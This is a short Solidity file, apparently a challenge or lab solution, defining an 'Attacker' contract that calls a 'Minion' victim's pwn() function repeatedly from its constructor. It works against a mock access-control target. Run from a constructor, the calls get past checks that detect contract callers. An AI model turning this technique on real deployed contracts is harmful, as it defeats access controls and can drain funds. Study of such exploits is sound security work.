pragma solidity 0.8.0;

import "./MockAccessControl.sol";

contract Attacker {
    Minion public victim;

    constructor(address _victim, uint256 value, uint256 interactions) payable {
        victim = Minion(_victim);

        for (uint256 i = 0; i < interactions; i++) {
            victim.pwn{value: value}();
        }
    }
}
